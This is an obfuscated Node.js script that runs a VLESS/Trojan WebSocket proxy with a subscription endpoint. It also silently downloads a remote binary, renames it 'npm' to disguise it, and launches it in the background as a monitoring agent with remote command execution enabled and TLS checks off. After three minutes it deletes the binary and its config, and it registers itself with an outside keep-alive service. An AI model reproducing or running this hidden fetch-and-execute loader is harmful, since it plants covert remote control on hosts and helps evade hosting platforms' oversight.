const _0x47be5f=_0x5c4a;(function(_0x41639a,_0x4f534a){const _0x2d2b5a=_0x5c4a,_0x5dd129=_0x41639a();while(!![]){try{const _0x2e1bf9=parseInt(_0x2d2b5a(0x13a))/0x1+parseInt(_0x2d2b5a(0xea))/0x2+-parseInt(_0x2d2b5a(0x141))/0x3*(-parseInt(_0x2d2b5a(0x136))/0x4)+parseInt(_0x2d2b5a(0x111))/0x5*(parseInt(_0x2d2b5a(0xfc))/0x6)+parseInt(_0x2d2b5a(0x12f))/0x7+-parseInt(_0x2d2b5a(0xe5))/0x8*(-parseInt(_0x2d2b5a(0x15a))/0x9)+parseInt(_0x2d2b5a(0xe6))/0xa*(-parseInt(_0x2d2b5a(0x11f))/0xb);if(_0x2e1bf9===_0x4f534a)break;else _0x5dd129['push'](_0x5dd129['shift']());}catch(_0x45b749){_0x5dd129['push'](_0x5dd129['shift']());}}}(_0x28ff,0xc052b));const os=require('os'),http=require(_0x47be5f(0xf4)),fs=require('fs'),axios=require(_0x47be5f(0x14c)),net=require('net'),path=require(_0x47be5f(0x115)),crypto=require(_0x47be5f(0x138)),{Buffer}=require(_0x47be5f(0xe8)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x47be5f(0xeb)]||_0x47be5f(0x10a),NEZHA_SERVER=process['env'][_0x47be5f(0x158)]||'',NEZHA_PORT=process['env'][_0x47be5f(0x139)]||'',NEZHA_KEY=process['env'][_0x47be5f(0x100)]||'',DOMAIN=process[_0x47be5f(0x125)]['DOMAIN']||_0x47be5f(0xfb),AUTO_ACCESS=process[_0x47be5f(0x125)]['AUTO_ACCESS']||!![],WSPATH=process[_0x47be5f(0x125)][_0x47be5f(0x128)]||UUID[_0x47be5f(0x109)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||_0x47be5f(0x13f),NAME=process[_0x47be5f(0x125)][_0x47be5f(0x143)]||_0x47be5f(0x15e),PORT=process['env'][_0x47be5f(0xf3)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2de1f6=_0x47be5f;try{const _0x1ad85b=await axios[_0x2de1f6(0xf0)](_0x2de1f6(0x13b)),_0x4b3f9c=_0x1ad85b[_0x2de1f6(0x13d)];ISP=(_0x4b3f9c['country']+'-'+_0x4b3f9c[_0x2de1f6(0xff)])[_0x2de1f6(0x137)](/ /g,'_');}catch(_0x5e7237){ISP=_0x2de1f6(0x133);}};GetISP();const httpServer=http[_0x47be5f(0x146)]((_0x11bc1c,_0x4c36e9)=>{const _0xe420f3=_0x47be5f;if(_0x11bc1c[_0xe420f3(0xfa)]==='/'){const _0x2b7334=path[_0xe420f3(0x135)](__dirname,_0xe420f3(0x124));fs[_0xe420f3(0x110)](_0x2b7334,_0xe420f3(0xf5),(_0x5bc688,_0x369236)=>{const _0x6bb2ac=_0xe420f3;if(_0x5bc688){_0x4c36e9[_0x6bb2ac(0xfe)](0xc8,{'Content-Type':_0x6bb2ac(0x132)}),_0x4c36e9[_0x6bb2ac(0x12c)]('Hello\x20world!');return;}_0x4c36e9[_0x6bb2ac(0xfe)](0xc8,{'Content-Type':'text/html'}),_0x4c36e9[_0x6bb2ac(0x12c)](_0x369236);});return;}else{if(_0x11bc1c['url']==='/'+SUB_PATH){const _0x2f2910=_0xe420f3(0xf6)+UUID+'@'+DOMAIN+_0xe420f3(0x11a)+DOMAIN+_0xe420f3(0x103)+DOMAIN+_0xe420f3(0x112)+WSPATH+'#'+NAME+'-'+ISP,_0xa6cfaf='trojan://'+UUID+'@'+DOMAIN+_0xe420f3(0xf8)+DOMAIN+_0xe420f3(0x103)+DOMAIN+_0xe420f3(0x112)+WSPATH+'#'+NAME+'-'+ISP,_0x15e647=_0x2f2910+'\x0a'+_0xa6cfaf,_0xc2871b=Buffer[_0xe420f3(0x14d)](_0x15e647)[_0xe420f3(0x154)]('base64');_0x4c36e9['writeHead'](0xc8,{'Content-Type':_0xe420f3(0x101)}),_0x4c36e9[_0xe420f3(0x12c)](_0xc2871b+'\x0a');}else _0x4c36e9[_0xe420f3(0xfe)](0x194,{'Content-Type':_0xe420f3(0x101)}),_0x4c36e9[_0xe420f3(0x12c)](_0xe420f3(0x142));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x47be5f(0x12d),'1.1.1.1'];function resolveHost(_0xf4ab0b){return new Promise((_0x5a9b5f,_0x5b50c1)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0xf4ab0b)){_0x5a9b5f(_0xf4ab0b);return;}let _0xfa478a=0x0;function _0x35aadf(){const _0xbaa33=_0x5c4a;if(_0xfa478a>=DNS_SERVERS[_0xbaa33(0x149)]){_0x5b50c1(new Error(_0xbaa33(0x12e)+_0xf4ab0b+_0xbaa33(0x157)));return;}const _0x4178df=DNS_SERVERS[_0xfa478a];_0xfa478a++;const _0x27abb2=_0xbaa33(0xf9)+encodeURIComponent(_0xf4ab0b)+_0xbaa33(0x15c);axios[_0xbaa33(0xf0)](_0x27abb2,{'timeout':0x1388,'headers':{'Accept':_0xbaa33(0x126)}})[_0xbaa33(0x15f)](_0x598809=>{const _0x5b9431=_0xbaa33,_0x3c5ebd=_0x598809['data'];if(_0x3c5ebd[_0x5b9431(0x118)]===0x0&&_0x3c5ebd[_0x5b9431(0x155)]&&_0x3c5ebd['Answer'][_0x5b9431(0x149)]>0x0){const _0x175e71=_0x3c5ebd[_0x5b9431(0x155)][_0x5b9431(0x104)](_0x4c902e=>_0x4c902e[_0x5b9431(0x10e)]===0x1);if(_0x175e71){_0x5a9b5f(_0x175e71[_0x5b9431(0x13d)]);return;}}_0x35aadf();})['catch'](_0x48c806=>{_0x35aadf();});}_0x35aadf();});}function _0x5c4a(_0x335f26,_0x277c2e){_0x335f26=_0x335f26-0xe5;const _0x28ff33=_0x28ff();let _0x5c4a35=_0x28ff33[_0x335f26];return _0x5c4a35;}function handleVlessConnection(_0x15fbfd,_0x27f79d){const _0x141050=_0x47be5f,[_0x2ef195]=_0x27f79d,_0x2d8718=_0x27f79d[_0x141050(0x109)](0x1,0x11);if(!_0x2d8718['every']((_0x86db8e,_0x296c07)=>_0x86db8e==parseInt(uuid[_0x141050(0x15b)](_0x296c07*0x2,0x2),0x10)))return![];let _0x348a39=_0x27f79d['slice'](0x11,0x12)[_0x141050(0x106)]()+0x13;const _0x58d2f2=_0x27f79d[_0x141050(0x109)](_0x348a39,_0x348a39+=0x2)[_0x141050(0xf2)](0x0),_0x56b146=_0x27f79d[_0x141050(0x109)](_0x348a39,_0x348a39+=0x1)['readUInt8'](),_0x37e8d0=_0x56b146==0x1?_0x27f79d[_0x141050(0x109)](_0x348a39,_0x348a39+=0x4)['join']('.'):_0x56b146==0x2?new TextDecoder()['decode'](_0x27f79d[_0x141050(0x109)](_0x348a39+0x1,_0x348a39+=0x1+_0x27f79d[_0x141050(0x109)](_0x348a39,_0x348a39+0x1)['readUInt8']())):_0x56b146==0x3?_0x27f79d['slice'](_0x348a39,_0x348a39+=0x10)[_0x141050(0x148)]((_0xbec832,_0x18cb52,_0x3ac849,_0x43a2c6)=>_0x3ac849%0x2?_0xbec832[_0x141050(0x11b)](_0x43a2c6[_0x141050(0x109)](_0x3ac849-0x1,_0x3ac849+0x1)):_0xbec832,[])[_0x141050(0x114)](_0xa5700d=>_0xa5700d[_0x141050(0xf2)](0x0)['toString'](0x10))[_0x141050(0x135)](':'):'';_0x15fbfd['send'](new Uint8Array([_0x2ef195,0x0]));const _0x164d25=createWebSocketStream(_0x15fbfd);return resolveHost(_0x37e8d0)[_0x141050(0x15f)](_0x58bcdc=>{const _0x3b6940=_0x141050;net[_0x3b6940(0x119)]({'host':_0x58bcdc,'port':_0x58d2f2},function(){const _0x2b5ee4=_0x3b6940;this[_0x2b5ee4(0x105)](_0x27f79d[_0x2b5ee4(0x109)](_0x348a39)),_0x164d25['on'](_0x2b5ee4(0x10c),()=>{})[_0x2b5ee4(0x14a)](this)['on'](_0x2b5ee4(0x10c),()=>{})['pipe'](_0x164d25);})['on'](_0x3b6940(0x10c),()=>{});})[_0x141050(0x107)](_0x2a29ec=>{const _0x1f9956=_0x141050;net[_0x1f9956(0x119)]({'host':_0x37e8d0,'port':_0x58d2f2},function(){const _0x7cf67e=_0x1f9956;this[_0x7cf67e(0x105)](_0x27f79d[_0x7cf67e(0x109)](_0x348a39)),_0x164d25['on'](_0x7cf67e(0x10c),()=>{})[_0x7cf67e(0x14a)](this)['on'](_0x7cf67e(0x10c),()=>{})[_0x7cf67e(0x14a)](_0x164d25);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x10820c,_0x24cd07){const _0x3a901f=_0x47be5f;try{if(_0x24cd07[_0x3a901f(0x149)]<0x3a)return![];const _0xf01718=_0x24cd07[_0x3a901f(0x109)](0x0,0x38)[_0x3a901f(0x154)](),_0x2c2057=[UUID];let _0x672135=null;for(const _0x126032 of _0x2c2057){const _0xc4c3ad=crypto[_0x3a901f(0x120)](_0x3a901f(0xed))[_0x3a901f(0xf7)](_0x126032)[_0x3a901f(0x127)](_0x3a901f(0x140));if(_0xc4c3ad===_0xf01718){_0x672135=_0x126032;break;}}if(!_0x672135)return![];let _0x3d1f10=0x38;_0x24cd07[_0x3d1f10]===0xd&&_0x24cd07[_0x3d1f10+0x1]===0xa&&(_0x3d1f10+=0x2);const _0x539653=_0x24cd07[_0x3d1f10];if(_0x539653!==0x1)return![];_0x3d1f10+=0x1;const _0x4c8a74=_0x24cd07[_0x3d1f10];_0x3d1f10+=0x1;let _0x259e7d,_0x440c0e;if(_0x4c8a74===0x1)_0x259e7d=_0x24cd07[_0x3a901f(0x109)](_0x3d1f10,_0x3d1f10+0x4)[_0x3a901f(0x135)]('.'),_0x3d1f10+=0x4;else{if(_0x4c8a74===0x3){const _0x1d848c=_0x24cd07[_0x3d1f10];_0x3d1f10+=0x1,_0x259e7d=_0x24cd07[_0x3a901f(0x109)](_0x3d1f10,_0x3d1f10+_0x1d848c)[_0x3a901f(0x154)](),_0x3d1f10+=_0x1d848c;}else{if(_0x4c8a74===0x4)_0x259e7d=_0x24cd07['slice'](_0x3d1f10,_0x3d1f10+0x10)[_0x3a901f(0x148)]((_0x43125b,_0x4ece3d,_0x55c54c,_0x433f72)=>_0x55c54c%0x2?_0x43125b[_0x3a901f(0x11b)](_0x433f72[_0x3a901f(0x109)](_0x55c54c-0x1,_0x55c54c+0x1)):_0x43125b,[])[_0x3a901f(0x114)](_0x1b4869=>_0x1b4869['readUInt16BE'](0x0)['toString'](0x10))[_0x3a901f(0x135)](':'),_0x3d1f10+=0x10;else return![];}}_0x440c0e=_0x24cd07[_0x3a901f(0xf2)](_0x3d1f10),_0x3d1f10+=0x2;_0x3d1f10<_0x24cd07['length']&&_0x24cd07[_0x3d1f10]===0xd&&_0x24cd07[_0x3d1f10+0x1]===0xa&&(_0x3d1f10+=0x2);const _0x1c316a=createWebSocketStream(_0x10820c);return resolveHost(_0x259e7d)[_0x3a901f(0x15f)](_0x395095=>{const _0x506857=_0x3a901f;net[_0x506857(0x119)]({'host':_0x395095,'port':_0x440c0e},function(){const _0x42b899=_0x506857;_0x3d1f10<_0x24cd07[_0x42b899(0x149)]&&this[_0x42b899(0x105)](_0x24cd07[_0x42b899(0x109)](_0x3d1f10)),_0x1c316a['on']('error',()=>{})[_0x42b899(0x14a)](this)['on']('error',()=>{})[_0x42b899(0x14a)](_0x1c316a);})['on'](_0x506857(0x10c),()=>{});})[_0x3a901f(0x107)](_0xb4cd32=>{const _0x2511f9=_0x3a901f;net[_0x2511f9(0x119)]({'host':_0x259e7d,'port':_0x440c0e},function(){const _0x5bd2c0=_0x2511f9;_0x3d1f10<_0x24cd07[_0x5bd2c0(0x149)]&&this[_0x5bd2c0(0x105)](_0x24cd07[_0x5bd2c0(0x109)](_0x3d1f10)),_0x1c316a['on']('error',()=>{})[_0x5bd2c0(0x14a)](this)['on'](_0x5bd2c0(0x10c),()=>{})['pipe'](_0x1c316a);})['on'](_0x2511f9(0x10c),()=>{});}),!![];}catch(_0x4f8d0a){return![];}}wss['on']('connection',(_0x5ef1d9,_0x4f8df8)=>{const _0x2df486=_0x47be5f,_0x9691f6=_0x4f8df8['url']||'';_0x5ef1d9[_0x2df486(0x122)]('message',_0x44b01a=>{const _0x1c0947=_0x2df486;if(_0x44b01a[_0x1c0947(0x149)]>0x11&&_0x44b01a[0x0]===0x0){const _0x3954a4=_0x44b01a['slice'](0x1,0x11),_0x25967b=_0x3954a4[_0x1c0947(0xe7)]((_0x39152a,_0x36c9fa)=>_0x39152a==parseInt(uuid[_0x1c0947(0x15b)](_0x36c9fa*0x2,0x2),0x10));if(_0x25967b){!handleVlessConnection(_0x5ef1d9,_0x44b01a)&&_0x5ef1d9['close']();return;}}!handleTrojanConnection(_0x5ef1d9,_0x44b01a)&&_0x5ef1d9[_0x1c0947(0x11c)]();})['on'](_0x2df486(0x10c),()=>{});});const getDownloadUrl=()=>{const _0x53eb8a=_0x47be5f,_0x54c33d=os['arch']();return _0x54c33d===_0x53eb8a(0x10b)||_0x54c33d===_0x53eb8a(0x14e)||_0x54c33d===_0x53eb8a(0x13c)?!NEZHA_PORT?_0x53eb8a(0x13e):_0x53eb8a(0x113):!NEZHA_PORT?_0x53eb8a(0x108):_0x53eb8a(0x134);},downloadFile=async()=>{const _0x24dd03=_0x47be5f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1c005d=getDownloadUrl(),_0x4b616d=await axios({'method':'get','url':_0x1c005d,'responseType':'stream'}),_0x16ac22=fs['createWriteStream'](_0x24dd03(0x116));return _0x4b616d[_0x24dd03(0x13d)]['pipe'](_0x16ac22),new Promise((_0x4f9e85,_0x430e51)=>{const _0x36896b=_0x24dd03;_0x16ac22['on'](_0x36896b(0x129),()=>{const _0x305781=_0x36896b;console[_0x305781(0x117)](_0x305781(0x14f)),exec('chmod\x20+x\x20npm',_0x3a3809=>{if(_0x3a3809)_0x430e51(_0x3a3809);_0x4f9e85();});}),_0x16ac22['on'](_0x36896b(0x10c),_0x430e51);});}catch(_0x79b48f){throw _0x79b48f;}},runnz=async()=>{const _0x5ad6fe=_0x47be5f;try{const _0x1f52de=execSync(_0x5ad6fe(0x156),{'encoding':_0x5ad6fe(0xf1)});if(_0x1f52de['trim']()!==''){console[_0x5ad6fe(0x117)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x440973){}await downloadFile();let _0x5a18d9='',_0x9ff394=[_0x5ad6fe(0xec),_0x5ad6fe(0x152),_0x5ad6fe(0x123),_0x5ad6fe(0x11d),'2083',_0x5ad6fe(0x121)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2331c4=_0x9ff394[_0x5ad6fe(0x130)](NEZHA_PORT)?_0x5ad6fe(0xee):'';_0x5a18d9=_0x5ad6fe(0x15d)+NEZHA_SERVER+':'+NEZHA_PORT+_0x5ad6fe(0x159)+NEZHA_KEY+'\x20'+_0x2331c4+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xf8d405=NEZHA_SERVER[_0x5ad6fe(0x130)](':')?NEZHA_SERVER[_0x5ad6fe(0x144)](':')[_0x5ad6fe(0x10d)]():'',_0xf2ee66=_0x9ff394['includes'](_0xf8d405)?_0x5ad6fe(0x145):_0x5ad6fe(0x12a),_0x3dab11='client_secret:\x20'+NEZHA_KEY+_0x5ad6fe(0x147)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0xf2ee66+_0x5ad6fe(0xfd)+UUID;fs[_0x5ad6fe(0x10f)](_0x5ad6fe(0x151),_0x3dab11);}_0x5a18d9='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x5ad6fe(0x117)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5a18d9,{'shell':'/bin/bash'},_0x20af47=>{const _0x589acf=_0x5ad6fe;if(_0x20af47)console[_0x589acf(0x10c)](_0x589acf(0x14b),_0x20af47);else console[_0x589acf(0x117)](_0x589acf(0xe9));});}catch(_0x232085){console['error'](_0x5ad6fe(0x131)+_0x232085);}};async function addAccessTask(){const _0x200689=_0x47be5f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x397bc7=_0x200689(0x150)+DOMAIN;try{const _0xe5fe3c=await axios[_0x200689(0x153)](_0x200689(0x12b),{'url':_0x397bc7},{'headers':{'Content-Type':_0x200689(0x102)}});console[_0x200689(0x117)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x1d7dec){}}const delFiles=()=>{const _0x439a40=_0x47be5f;fs['unlink'](_0x439a40(0x116),()=>{}),fs['unlink'](_0x439a40(0x151),()=>{});};function _0x28ff(){const _0x3c97e4=['readUInt16BE','PORT','http','utf8','vless://','update',':443?security=tls&sni=','https://dns.google/resolve?name=','url','1234.abc.com','18300igwVHv','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','writeHead','asOrganization','NEZHA_KEY','text/plain','application/json','&fp=chrome&type=ws&host=','find','write','readUInt8','catch','https://amd64.ssss.nyc.mn/v1','slice','7daaf6c3-cc74-4a87-ab79-ee600256b76f','arm','error','pop','type','writeFileSync','readFile','1315mjjgvg','&path=%2F','https://arm64.ssss.nyc.mn/agent','map','path','npm','log','Status','connect',':443?encryption=none&security=tls&sni=','concat','close','2087','Server\x20is\x20running\x20on\x20port\x20','1085579SwMHHi','createHash','2053','once','2096','index.html','env','application/dns-json','digest','WSPATH','finish','false','https://oooo.serv00.net/add-url','end','8.8.4.4','Failed\x20to\x20resolve\x20','6721939SVtkso','includes','error:\x20','text/html','Unknown','https://amd64.ssss.nyc.mn/agent','join','184svkvrT','replace','crypto','NEZHA_PORT','1501788IyzlFU','https://speed.cloudflare.com/meta','aarch64','data','https://arm64.ssss.nyc.mn/v1','sub','hex','94191fLRUEy','Not\x20Found\x0a','NAME','split','true','createServer','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','reduce','length','pipe','npm\x20running\x20error:','axios','from','arm64','npm\x20download\x20successfully','https://','config.yaml','8443','post','toString','Answer','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','\x20with\x20all\x20DNS\x20servers','NEZHA_SERVER','\x20-p\x20','5164668CGJwoS','substr','&type=A','setsid\x20nohup\x20./npm\x20-s\x20','Hug','then','8KJJfLs','560iDWeaR','every','buffer','npm\x20is\x20running','2064020nHQeyp','UUID','443','sha224','--tls','listen','get','utf-8'];_0x28ff=function(){return _0x3c97e4;};return _0x28ff();}httpServer[_0x47be5f(0xef)](PORT,()=>{const _0xad5cbb=_0x47be5f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xad5cbb(0x117)](_0xad5cbb(0x11e)+PORT);});
